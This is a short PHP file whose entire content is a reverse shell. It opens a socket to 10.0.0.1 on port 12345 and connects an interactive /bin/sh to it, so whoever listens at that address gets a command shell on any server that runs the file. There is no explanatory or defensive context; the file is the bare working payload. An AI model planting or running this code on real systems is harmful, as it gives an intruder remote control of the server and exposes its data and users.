<?php

$sock=fsockopen("10.0.0.1",12345);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);

?>